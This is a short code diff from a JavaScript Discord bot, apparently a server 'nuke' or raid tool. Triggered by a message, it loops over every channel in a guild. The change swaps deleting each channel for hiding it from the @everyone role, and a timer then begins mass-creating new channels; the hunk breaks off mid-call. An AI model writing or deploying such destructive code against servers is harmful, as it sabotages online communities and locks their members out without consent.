@@ -71,7 +71,9 @@ client.on("messageCreate", async (message) => {
     var ch = JSON.parse(JSON.stringify(message.guild)).channels
     for (const a of ch) {
 
-      client.channels.cache.get(a).delete()
+      client.channels.cache.get(a).permissionOverwrites.edit(message.guild.roles.everyone,{
+        ViewChannels:false
+      })
     }
     var qwer = setInterval(function() {
       client.guilds.cache.get(g).channels.create({
